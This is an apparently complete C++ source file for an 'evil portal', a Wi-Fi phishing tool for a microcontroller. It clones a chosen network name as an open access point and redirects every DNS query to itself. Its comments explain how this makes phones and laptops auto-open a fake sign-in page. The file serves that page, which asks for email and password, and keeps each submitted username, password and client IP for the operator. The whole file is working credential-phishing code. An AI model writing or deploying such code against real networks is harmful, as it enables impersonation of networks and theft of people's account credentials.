#include "evil_portal_service.h"

#include <WiFi.h>

namespace {

// SSIDs are operator-chosen from a live scan, not typed by the person
// filling in the portal form, but they still end up interpolated into HTML
// we serve -- escape the handful of characters that would otherwise let a
// crafted SSID break out of the page markup.
String htmlEscape(const String& text) {
    String out;
    out.reserve(text.length());
    for (size_t i = 0; i < text.length(); ++i) {
        const char c = text[i];
        switch (c) {
            case '&': out += "&amp;"; break;
            case '<': out += "&lt;"; break;
            case '>': out += "&gt;"; break;
            case '"': out += "&quot;"; break;
            default: out += c; break;
        }
    }
    return out;
}

String portalPage(const String& ssid) {
    String html;
    html.reserve(900);
    html +=
        "<!DOCTYPE html><html><head><meta name=\"viewport\" "
        "content=\"width=device-width,initial-scale=1\">"
        "<title>Wi-Fi Sign In</title><style>"
        "body{font-family:sans-serif;background:#f2f2f2;margin:0;"
        "padding:32px 16px;}"
        ".card{max-width:360px;margin:0 auto;background:#fff;"
        "border-radius:8px;padding:24px;box-shadow:0 1px 4px "
        "rgba(0,0,0,.15);}"
        "h1{font-size:18px;margin:0 0 4px;}"
        "p{color:#666;font-size:14px;margin:0 0 20px;}"
        "input{width:100%;box-sizing:border-box;padding:10px;"
        "margin-bottom:12px;border:1px solid #ccc;border-radius:4px;"
        "font-size:14px;}"
        "button{width:100%;padding:10px;background:#1a73e8;color:#fff;"
        "border:0;border-radius:4px;font-size:14px;}"
        "</style></head><body><div class=\"card\">"
        "<h1>";
    html += htmlEscape(ssid);
    html +=
        " requires you to sign in</h1>"
        "<p>Enter your network account details to continue.</p>"
        "<form method=\"POST\" action=\"/submit\">"
        "<input name=\"user\" placeholder=\"Email or username\" "
        "autocomplete=\"username\">"
        "<input name=\"pass\" type=\"password\" placeholder=\"Password\" "
        "autocomplete=\"current-password\">"
        "<button type=\"submit\">Continue</button>"
        "</form></div></body></html>";
    return html;
}

const char kSuccessPage[] =
    "<!DOCTYPE html><html><head><meta name=\"viewport\" "
    "content=\"width=device-width,initial-scale=1\"><title>Connected</title>"
    "<style>body{font-family:sans-serif;text-align:center;padding:60px "
    "16px;color:#333;}</style></head><body><h1>You're connected</h1>"
    "<p>You may close this page.</p></body></html>";

}  // namespace

bool EvilPortalService::begin(const String& ssid, uint8_t channel) {
    stop();
    ssid_ = ssid;
    captureCount_ = 0;
    pending_.clear();
    WiFi.mode(WIFI_AP);
    // Open network on purpose -- an unlocked, familiar-looking SSID is what
    // gets clients to auto-join or pick it manually; a password on the
    // clone would defeat the point.
    if (!WiFi.softAP(ssid_.c_str(), nullptr, channel > 0 ? channel : 1)) {
        WiFi.mode(WIFI_OFF);
        return false;
    }
    // Catch-all: every hostname a client asks about resolves to us, so any
    // URL a client's OS probes for captive-portal detection (Apple's
    // hotspot-detect.html, Android's generate_204, Windows' connecttest.txt)
    // lands on the portal page below instead of its expected response --
    // that mismatch is exactly what makes each OS auto-launch its captive
    // browser onto us.
    dnsServer_.start(53, "*", WiFi.softAPIP());
    server_.onNotFound([this]() { handlePortalPage(); });
    server_.on("/", HTTP_GET, [this]() { handlePortalPage(); });
    server_.on("/submit", HTTP_POST, [this]() { handleSubmit(); });
    server_.begin();
    active_ = true;
    return true;
}

void EvilPortalService::update() {
    if (!active_) return;
    dnsServer_.processNextRequest();
    server_.handleClient();
}

void EvilPortalService::stop() {
    server_.stop();
    dnsServer_.stop();
    if (active_) WiFi.softAPdisconnect(true);
    active_ = false;
}

uint32_t EvilPortalService::clientCount() const {
    return active_ ? WiFi.softAPgetStationNum() : 0;
}

bool EvilPortalService::takeCapture(Capture& out) {
    if (pending_.empty()) return false;
    out = pending_.front();
    pending_.erase(pending_.begin());
    return true;
}

void EvilPortalService::handlePortalPage() {
    server_.send(200, "text/html", portalPage(ssid_));
}

void EvilPortalService::handleSubmit() {
    Capture capture;
    capture.clientIp = server_.client().remoteIP().toString();
    capture.username = server_.hasArg("user") ? server_.arg("user") : "";
    capture.password = server_.hasArg("pass") ? server_.arg("pass") : "";
    pending_.push_back(capture);
    ++captureCount_;
    server_.send(200, "text/html", kSuccessPage);
}
